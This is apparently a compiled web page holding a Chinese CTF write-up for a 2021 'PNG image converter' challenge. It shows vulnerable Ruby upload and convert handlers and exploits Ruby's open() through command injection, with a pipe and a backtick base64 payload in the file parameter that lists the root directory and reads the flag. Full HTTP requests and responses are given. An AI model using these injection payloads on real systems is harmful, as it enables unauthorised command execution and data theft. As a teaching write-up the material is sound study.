import{_ as s,o as n,c as a,O as l}from"./chunks/framework.aacc0fa0.js";const F=JSON.parse('{"title":"","description":"","frontmatter":{},"headers":[],"relativePath":"CTF_Web_PNG图片转换器.md"}'),p={name:"CTF_Web_PNG图片转换器.md"},e=l(`<div class="info custom-block"><p class="custom-block-title">INFO</p><p>2021-第五届空间智能安全大赛-Web-PNG图片转换器</p></div><h2 id="_1、思路" tabindex="-1">1、思路 <a class="header-anchor" href="#_1、思路" aria-label="Permalink to &quot;1、思路&quot;">​</a></h2><p>（1）上传文件，没有限制文件类型，仅检查了文件扩展名是否为 png，但由于文件名取其摘要，无法通过一句话木马的方法获取 flag</p><div class="language-ruby"><button title="Copy Code" class="copy"></button><span class="lang">ruby</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">post </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">/upload</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">do</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;font-style:italic;">unless</span><span style="color:#A6ACCD;"> params</span><span style="color:#89DDFF;">[:file]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&amp;&amp;</span><span style="color:#A6ACCD;"> params</span><span style="color:#89DDFF;">[:file][:tempfile]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&amp;&amp;</span><span style="color:#A6ACCD;"> params</span><span style="color:#89DDFF;">[:file][:filename]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&amp;&amp;</span><span style="color:#A6ACCD;"> params</span><span style="color:#89DDFF;">[:file][:filename].</span><span style="color:#A6ACCD;">split</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">.</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)[-</span><span style="color:#F78C6C;">1</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">==</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">png</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">&lt;script&gt;alert(&#39;error&#39;);location.href=&#39;/upload&#39;;&lt;/script&gt;</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;font-style:italic;">end</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;font-style:italic;">begin</span></span>
<span class="line"><span style="color:#A6ACCD;">    filename </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">Digest</span><span style="color:#89DDFF;">::</span><span style="color:#FFCB6B;">MD5</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">hexdigest</span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">Time</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">now</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">to_i</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">to_s </span><span style="color:#89DDFF;">+</span><span style="color:#A6ACCD;"> params</span><span style="color:#89DDFF;">[:file][:filename])</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">+</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">.png</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#82AAFF;">open</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">filename</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">wb</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">f</span><span style="color:#89DDFF;">|</span></span>
<span class="line"><span style="color:#A6ACCD;">      f</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">write </span><span style="color:#82AAFF;">open</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">params</span><span style="color:#89DDFF;">[:file][:tempfile],</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">r</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">).</span><span style="color:#A6ACCD;">read</span><span style="color:#89DDFF;">()</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">Upload success, file stored at </span><span style="color:#89DDFF;">#{</span><span style="color:#A6ACCD;">filename</span><span style="color:#89DDFF;">}</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;font-style:italic;">rescue</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">something wrong</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;font-style:italic;">end</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;font-style:italic;">end</span></span></code></pre></div><p>（2）转换文件，对符号 .. 和 / 进行了过滤，使用了不安全的函数 <code>open</code>，并输出 base64 编码的文件名</p><div class="language-ruby"><button title="Copy Code" class="copy"></button><span class="lang">ruby</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">post </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">/convert</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">do</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;font-style:italic;">begin</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">unless</span><span style="color:#A6ACCD;"> params</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">file</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">&lt;script&gt;alert(&#39;error&#39;);location.href=&#39;/convert&#39;;&lt;/script&gt;</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">end</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">    file </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> params</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">file</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">unless</span><span style="color:#A6ACCD;"> file</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">index</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">..</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">==</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">nil</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&amp;&amp;</span><span style="color:#A6ACCD;"> file</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">index</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">/</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">==</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">nil</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&amp;&amp;</span><span style="color:#A6ACCD;"> file </span><span style="color:#89DDFF;">=~</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">/</span><span style="color:#C3E88D;">^</span><span style="color:#89DDFF;">(</span><span style="color:#C3E88D;">.+</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">\\.</span><span style="color:#C3E88D;">png$</span><span style="color:#89DDFF;">/</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">&lt;script&gt;alert(&#39;dont hack me&#39;);&lt;/script&gt;</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">end</span></span>
<span class="line"><span style="color:#A6ACCD;">    res </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">open</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">file</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">r</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">).</span><span style="color:#A6ACCD;">read</span><span style="color:#89DDFF;">()</span></span>
<span class="line"><span style="color:#A6ACCD;">    headers </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Content-Type</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">text/html; charset=utf-8</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">var img = document.createElement(</span><span style="color:#A6ACCD;">\\&quot;</span><span style="color:#C3E88D;">img</span><span style="color:#A6ACCD;">\\&quot;</span><span style="color:#C3E88D;">);</span><span style="color:#A6ACCD;">\\n</span><span style="color:#C3E88D;">img.src= </span><span style="color:#A6ACCD;">\\&quot;</span><span style="color:#C3E88D;">data:image/png;base64,</span><span style="color:#89DDFF;">&quot;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">+</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">Base64</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">encode64</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">res</span><span style="color:#89DDFF;">).</span><span style="color:#82AAFF;">gsub</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">/</span><span style="color:#A6ACCD;">\\s</span><span style="color:#C3E88D;">*</span><span style="color:#89DDFF;">/</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">+</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#A6ACCD;">\\&quot;</span><span style="color:#C3E88D;">;</span><span style="color:#A6ACCD;">\\n</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;font-style:italic;">rescue</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">something wrong</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;font-style:italic;">end</span></span>
<span class="line"><span style="color:#89DDFF;font-style:italic;">end</span></span></code></pre></div><p>（3）bp 截获请求报文，其中 file 的参数是文件名的 base64 编码，93511aa79635584bc1502b813fde80b7.png</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">POST /convert HTTP/1.1</span></span>
<span class="line"><span style="color:#A6ACCD;">Host: challenge-7157e81cd821f195.sandbox.ctfhub.com:10800</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Length: 37</span></span>
<span class="line"><span style="color:#A6ACCD;">Cache-Control: max-age=0</span></span>
<span class="line"><span style="color:#A6ACCD;">Upgrade-Insecure-Requests: 1</span></span>
<span class="line"><span style="color:#A6ACCD;">Origin: http://challenge-7157e81cd821f195.sandbox.ctfhub.com:10800</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color:#A6ACCD;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="line"><span style="color:#A6ACCD;">Referer: http://challenge-7157e81cd821f195.sandbox.ctfhub.com:10800/convert</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept-Encoding: gzip, deflate</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept-Language: zh-CN,zh;q=0.9</span></span>
<span class="line"><span style="color:#A6ACCD;">Connection: close</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">file=93511aa79635584bc1502b813fde80b7</span></span></code></pre></div><h2 id="_2、文件名嵌入命令" tabindex="-1">2、文件名嵌入命令 <a class="header-anchor" href="#_2、文件名嵌入命令" aria-label="Permalink to &quot;2、文件名嵌入命令&quot;">​</a></h2><h3 id="文件名" tabindex="-1">文件名 <a class="header-anchor" href="#文件名" aria-label="Permalink to &quot;文件名&quot;">​</a></h3><p>由于输对文件名才会输出 <code>res = open(file, &#39;r&#39;).read()</code>，因此需要保证文件名的正确性</p><blockquote><p>file=93511aa79635584bc1502b813fde80b7.png</p></blockquote><h3 id="管道符" tabindex="-1">管道符 <a class="header-anchor" href="#管道符" aria-label="Permalink to &quot;管道符&quot;">​</a></h3><p>一个命令的输出可以通过管道作为另一个命令的输入</p><h3 id="反引号" tabindex="-1">反引号 <a class="header-anchor" href="#反引号" aria-label="Permalink to &quot;反引号&quot;">​</a></h3><p>反引号间的内容会被 shell 先执行，其输出被放入主命令后，主命令再被执行</p><p><code>ls -l</code></p><p>⚠️ 由于对符号 .. 和 / 进行了过滤，可以先 base64 编码再解码 <code>echo bHMgLw== | base64 -d</code>（<code>-d</code> 解码，借助 <code>echo</code> 和管道符作为 base64 的参数）</p><blockquote><p>\`echo bHMgLw== | base64 -d\` &gt; 93511aa79635584bc1502b813fde80b7.png</p></blockquote><p>即执行 <code>ls -l</code> 命令并将输出结果写入了 93511aa79635584bc1502b813fde80b7.png</p><h3 id="赋值" tabindex="-1">赋值 <a class="header-anchor" href="#赋值" aria-label="Permalink to &quot;赋值&quot;">​</a></h3><blockquote><p>file=|\`echo bHMgLw== | base64 -d\` &gt; 93511aa79635584bc1502b813fde80b7.png</p></blockquote><h2 id="_3、exp" tabindex="-1">3、exp <a class="header-anchor" href="#_3、exp" aria-label="Permalink to &quot;3、exp&quot;">​</a></h2><p>（1）写入图片</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">POST /convert HTTP/1.1</span></span>
<span class="line"><span style="color:#A6ACCD;">Host: challenge-7157e81cd821f195.sandbox.ctfhub.com:10800</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Length: 41</span></span>
<span class="line"><span style="color:#A6ACCD;">Cache-Control: max-age=0</span></span>
<span class="line"><span style="color:#A6ACCD;">Upgrade-Insecure-Requests: 1</span></span>
<span class="line"><span style="color:#A6ACCD;">Origin: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color:#A6ACCD;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="line"><span style="color:#A6ACCD;">Referer: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800/convert</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept-Encoding: gzip, deflate, br</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept-Language: zh-CN,zh;q=0.9</span></span>
<span class="line"><span style="color:#A6ACCD;">Connection: close</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">file=|\`echo bHMgLw== | base64 -d\`&gt;93511aa79635584bc1502b813fde80b7</span></span></code></pre></div><p>（2）读取图片执行命令</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">POST /convert HTTP/1.1</span></span>
<span class="line"><span style="color:#A6ACCD;">Host: challenge-7157e81cd821f195.sandbox.ctfhub.com:10800</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Length: 41</span></span>
<span class="line"><span style="color:#A6ACCD;">Cache-Control: max-age=0</span></span>
<span class="line"><span style="color:#A6ACCD;">Upgrade-Insecure-Requests: 1</span></span>
<span class="line"><span style="color:#A6ACCD;">Origin: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color:#A6ACCD;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="line"><span style="color:#A6ACCD;">Referer: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800/convert</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept-Encoding: gzip, deflate, br</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept-Language: zh-CN,zh;q=0.9</span></span>
<span class="line"><span style="color:#A6ACCD;">Connection: close</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">file=93511aa79635584bc1502b813fde80b7</span></span></code></pre></div><p>Response</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">HTTP/1.1 200 OK</span></span>
<span class="line"><span style="color:#A6ACCD;">Server: openresty/1.21.4.2</span></span>
<span class="line"><span style="color:#A6ACCD;">Date: Tue, 05 Mar 2024 01:58:09 GMT</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Type: text/html; charset=utf-8</span></span>
<span class="line"><span style="color:#A6ACCD;">Connection: close</span></span>
<span class="line"><span style="color:#A6ACCD;">X-Xss-Protection: 1; mode=block</span></span>
<span class="line"><span style="color:#A6ACCD;">X-Content-Type-Options: nosniff</span></span>
<span class="line"><span style="color:#A6ACCD;">X-Frame-Options: SAMEORIGIN</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Origin: *</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Headers: X-Requested-With</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Methods: *</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Length: 204</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">var img = document.createElement(&quot;img&quot;);</span></span>
<span class="line"><span style="color:#A6ACCD;">img.src= &quot;data:image/png;base64,YmluCmJvb3QKZGV2CmV0YwpmbGFnXzIxNDc5CmhvbWUKbGliCmxpYjY0Cm1lZGlhCm1udApvcHQKcHJvYwpyb290CnJ1bgpzYmluCnNydgpzeXMKdG1wCnVzcgp2YXIK&quot;;</span></span></code></pre></div><p>解码结果</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">bin</span></span>
<span class="line"><span style="color:#A6ACCD;">boot</span></span>
<span class="line"><span style="color:#A6ACCD;">dev</span></span>
<span class="line"><span style="color:#A6ACCD;">etc</span></span>
<span class="line"><span style="color:#A6ACCD;">flag_21479</span></span>
<span class="line"><span style="color:#A6ACCD;">home</span></span>
<span class="line"><span style="color:#A6ACCD;">lib</span></span>
<span class="line"><span style="color:#A6ACCD;">lib64</span></span>
<span class="line"><span style="color:#A6ACCD;">media</span></span>
<span class="line"><span style="color:#A6ACCD;">mnt</span></span>
<span class="line"><span style="color:#A6ACCD;">opt</span></span>
<span class="line"><span style="color:#A6ACCD;">proc</span></span>
<span class="line"><span style="color:#A6ACCD;">root</span></span>
<span class="line"><span style="color:#A6ACCD;">run</span></span>
<span class="line"><span style="color:#A6ACCD;">sbin</span></span>
<span class="line"><span style="color:#A6ACCD;">srv</span></span>
<span class="line"><span style="color:#A6ACCD;">sys</span></span>
<span class="line"><span style="color:#A6ACCD;">tmp</span></span>
<span class="line"><span style="color:#A6ACCD;">usr</span></span>
<span class="line"><span style="color:#A6ACCD;">var</span></span></code></pre></div><p>（3）读取图片执行命令</p><p>命令：<code>cat /flag_21479</code></p><p>base64：Y2F0IC9mbGFnXzIxNDc5</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">POST /convert HTTP/1.1</span></span>
<span class="line"><span style="color:#A6ACCD;">Host: challenge-7157e81cd821f195.sandbox.ctfhub.com:10800</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Length: 41</span></span>
<span class="line"><span style="color:#A6ACCD;">Cache-Control: max-age=0</span></span>
<span class="line"><span style="color:#A6ACCD;">Upgrade-Insecure-Requests: 1</span></span>
<span class="line"><span style="color:#A6ACCD;">Origin: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color:#A6ACCD;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="line"><span style="color:#A6ACCD;">Referer: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800/convert</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept-Encoding: gzip, deflate, br</span></span>
<span class="line"><span style="color:#A6ACCD;">Accept-Language: zh-CN,zh;q=0.9</span></span>
<span class="line"><span style="color:#A6ACCD;">Connection: close</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">file=|\`echo Y2F0IC9mbGFnXzIxNDc5 | base64 -d\`&gt;93511aa79635584bc1502b813fde80b7</span></span></code></pre></div><p>Response</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">HTTP/1.1 200 OK</span></span>
<span class="line"><span style="color:#A6ACCD;">Server: openresty/1.21.4.2</span></span>
<span class="line"><span style="color:#A6ACCD;">Date: Tue, 05 Mar 2024 02:04:01 GMT</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Type: text/html; charset=utf-8</span></span>
<span class="line"><span style="color:#A6ACCD;">Connection: close</span></span>
<span class="line"><span style="color:#A6ACCD;">X-Xss-Protection: 1; mode=block</span></span>
<span class="line"><span style="color:#A6ACCD;">X-Content-Type-Options: nosniff</span></span>
<span class="line"><span style="color:#A6ACCD;">X-Frame-Options: SAMEORIGIN</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Origin: *</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Headers: X-Requested-With</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Methods: *</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Length: 120</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">var img = document.createElement(&quot;img&quot;);</span></span>
<span class="line"><span style="color:#A6ACCD;">img.src= &quot;data:image/png;base64,Y3RmaHViezRkZTc5NzI0Y2U5ZDYxMTRiM2RjOWE4MX0K&quot;;</span></span></code></pre></div><p>解码结果</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">ctfhub{4de79724ce9d6114b3dc9a81}</span></span></code></pre></div>`,39),o=[e];function c(t,r,C,D,i,A){return n(),a("div",null,o)}const d=s(p,[["render",c]]);export{F as __pageData,d as default};
